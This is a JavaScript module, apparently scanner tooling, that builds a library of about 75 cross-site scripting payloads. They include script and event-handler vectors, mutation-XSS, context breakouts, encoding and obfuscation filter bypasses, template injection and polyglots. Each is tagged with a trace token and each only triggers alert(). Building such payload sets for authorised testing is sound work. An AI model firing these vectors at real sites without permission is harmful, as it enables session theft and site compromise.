// @ts-check
/**
 * XSS payload library.
 * Every payload gets a unique token (XSS_Pnn) substituted for the XSS_T placeholder,
 * so an execution/reflection can be correlated back to the exact vector.
 */
function makePayloads() {
  const P = [];
  let n = 0;
  const add = (name, value, ctx = 'html') => {
    n++;
    P.push({ id: 'P' + String(n).padStart(2, '0'), name, value, ctx });
  };

  // --- Script tag variants ---
  add('script-basic',        `<script>alert('XSS_T')</script>`);
  add('script-mixedcase',    `<ScRiPt>alert('XSS_T')</sCrIpT>`);
  add('script-spaced',       `<script >alert('XSS_T')</script >`);
  add('script-slash-src',    `<script/src=data:,alert('XSS_T')></script>`);
  add('script-unicode-esc',  `<script>al\\u0065rt('XSS_T')</script>`);
  add('script-nested',       `<scr<script>ipt>alert('XSS_T')</scr</script>ipt>`);

  // --- IMG ---
  add('img-onerror',         `<img src=x onerror=alert('XSS_T')>`);
  add('img-onerror-quoted',  `<img src=x onerror="alert('XSS_T')">`);
  add('img-slash-sep',       `<img/src=x/onerror=alert('XSS_T')>`);
  add('img-backtick',        "<img src=x onerror=alert`XSS_T`>");
  add('img-entity-fn',       `<img src=x onerror=&#97;lert('XSS_T')>`);
  add('img-srcset',          `<img src=1 srcset=x onerror=alert('XSS_T')>`);

  // --- SVG ---
  add('svg-onload',          `<svg onload=alert('XSS_T')>`);
  add('svg-onload-slash',    `<svg/onload=alert('XSS_T')>`);
  add('svg-script',          `<svg><script>alert('XSS_T')</script></svg>`);
  add('svg-animate',         `<svg><animate onbegin=alert('XSS_T') attributeName=x dur=1s>`);
  add('svg-set',             `<svg><set attributeName=x onbegin=alert('XSS_T')>`);
  add('svg-foreignobject',   `<svg><foreignObject><iframe onload=alert('XSS_T')></iframe></foreignObject></svg>`);

  // --- document-level events ---
  add('body-onload',         `<body onload=alert('XSS_T')>`);
  add('body-onpageshow',     `<body onpageshow=alert('XSS_T')>`);
  add('html-onmouseover',    `<html onmouseover=alert('XSS_T')>`);

  // --- autofocus / focus (fire with no user interaction) ---
  add('input-autofocus',     `<input autofocus onfocus=alert('XSS_T')>`);
  add('select-autofocus',    `<select autofocus onfocus=alert('XSS_T')><option>`);
  add('textarea-autofocus',  `<textarea autofocus onfocus=alert('XSS_T')>`);
  add('keygen-autofocus',    `<keygen autofocus onfocus=alert('XSS_T')>`);

  // --- media ---
  add('video-source',        `<video><source onerror=alert('XSS_T')></video>`);
  add('audio-onerror',       `<audio src=x onerror=alert('XSS_T')>`);
  add('video-onloadstart',   `<video autoplay onloadstart=alert('XSS_T')><source src=x></video>`);

  // --- misc event tags ---
  add('details-ontoggle',    `<details open ontoggle=alert('XSS_T')>`);
  add('marquee-onstart',     `<marquee onstart=alert('XSS_T')>x</marquee>`);
  add('style-animation',     `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert('XSS_T')"></xss>`);

  // --- object / embed / iframe / frame ---
  add('object-js',           `<object data="javascript:alert('XSS_T')"></object>`);
  add('embed-js',            `<embed src="javascript:alert('XSS_T')">`);
  add('iframe-js',           `<iframe src="javascript:alert('XSS_T')"></iframe>`);
  add('iframe-srcdoc',       `<iframe srcdoc="&lt;script&gt;alert('XSS_T')&lt;/script&gt;"></iframe>`);

  // --- form / formaction ---
  add('button-formaction',   `<form><button formaction="javascript:alert('XSS_T')">x</button></form>`);

  // --- mutation / mXSS ---
  add('mxss-mglyph',         `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS_T')>`);
  add('noscript-mxss',       `<noscript><p title="</noscript><img src=x onerror=alert('XSS_T')>">`);

  // --- attribute-value breakouts ---
  add('attr-dq-script',      `"><script>alert('XSS_T')</script>`, 'attr');
  add('attr-sq-script',      `'><script>alert('XSS_T')</script>`, 'attr');
  add('attr-dq-img',         `"><img src=x onerror=alert('XSS_T')>`, 'attr');
  add('attr-sq-svg',         `'><svg onload=alert('XSS_T')>`, 'attr');
  add('attr-dq-focus',       `" autofocus onfocus=alert('XSS_T') x="`, 'attr');
  add('attr-sq-focus',       `' autofocus onfocus=alert('XSS_T') x='`, 'attr');
  add('attr-onmouseover',    `" onmouseover="alert('XSS_T')`, 'attr');
  add('attr-svg-slash',      `"><svg/onload=alert('XSS_T')>`, 'attr');

  // --- tag-context breakouts ---
  add('break-textarea',      `</textarea><script>alert('XSS_T')</script>`, 'textarea');
  add('break-title',         `</title><script>alert('XSS_T')</script>`);
  add('break-style',         `</style><script>alert('XSS_T')</script>`);
  add('break-comment',       `--><script>alert('XSS_T')</script>`, 'comment');

  // --- JS string / script-block breakouts ---
  add('js-sq-break',         `';alert('XSS_T')//`, 'js');
  add('js-dq-break',         `";alert('XSS_T')//`, 'js');
  add('js-close-script',     `</script><script>alert('XSS_T')</script>`, 'js');
  add('js-comment-break',    `*/alert('XSS_T')//`, 'js');
  add('js-fromcharcode',     `';alert(String.fromCharCode(88,83,83))//`, 'js');

  // --- URL-sink vectors ---
  add('url-javascript',      `javascript:alert('XSS_T')`, 'url');
  add('url-js-mixedcase',    `JaVaScRiPt:alert('XSS_T')`, 'url');
  add('url-js-tab',          `java\tscript:alert('XSS_T')`, 'url');
  add('url-data-html',       `data:text/html,<script>alert('XSS_T')</script>`, 'url');
  add('url-vbscript',        `vbscript:alert('XSS_T')`, 'url');

  // --- encoding bypasses ---
  add('enc-html-entity',     `&lt;script&gt;alert('XSS_T')&lt;/script&gt;`);
  add('enc-decimal',         `&#60;script&#62;alert('XSS_T')&#60;/script&#62;`);
  add('enc-hex',             `&#x3C;script&#x3E;alert('XSS_T')&#x3C;/script&#x3E;`);
  add('enc-url',             `%3Cscript%3Ealert('XSS_T')%3C/script%3E`);
  add('enc-double-url',      `%253Cscript%253Ealert('XSS_T')%253C%252Fscript%253E`);
  add('enc-nullbyte',        `<scri\u0000pt>alert('XSS_T')</script>`);

  // --- obfuscation / filter bypass ---
  add('obf-window-concat',   `<img src=x onerror=window['al'+'ert']('XSS_T')>`);
  add('obf-self-bracket',    `<img src=x onerror=self['alert']('XSS_T')>`);
  add('obf-top-eval',        `<img src=x onerror=top['eval']("alert('XSS_T')")>`);
  add('obf-href-colon',      `<a href="javascript&colon;alert('XSS_T')">x</a>`, 'url');

  // --- framework / template injection ---
  add('ng-constructor',      `{{constructor.constructor('alert(\\'XSS_T\\')')()}}`, 'template');
  add('ng-on-constructor',   `{{$on.constructor('alert(\\'XSS_T\\')')()}}`, 'template');
  add('vue-c-constructor',   `{{_c.constructor('alert(\\'XSS_T\\')')()}}`, 'template');
  add('ssti-dollar',         `\${alert('XSS_T')}`, 'template');

  // --- polyglots ---
  add('polyglot-sobky',      `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('XSS_T') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS_T')//>`);
  add('polyglot-short',      `'"><img src=x onerror=alert('XSS_T')>`, 'attr');

  for (const p of P) {
    p.token = 'XSS_' + p.id;                 // e.g. XSS_P07
    p.value = p.value.split('XSS_T').join(p.token);
  }
  return P;
}

module.exports = { makePayloads };
